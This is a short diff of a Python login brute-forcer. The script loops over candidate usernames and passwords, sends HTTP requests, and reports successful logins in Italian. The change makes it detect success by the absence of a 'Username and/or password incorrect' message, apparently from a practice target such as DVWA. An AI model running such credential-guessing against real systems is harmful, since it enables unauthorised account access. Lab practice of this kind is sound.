@@ -37,6 +37,8 @@ for usr in user:
         conn.request("GET", url_target, post_parameters, headers) 
         response = conn.getresponse()
         page_content = response.read().decode()
-        if "Welcome to the password protected" in str(page_content):
+        if "Username and/or password incorrect" in str(page_content):
+            continue
+        else:
             print(f"Accesso effettuato con username: '{usr}' - password: '{pwd}'")
         conn.close()
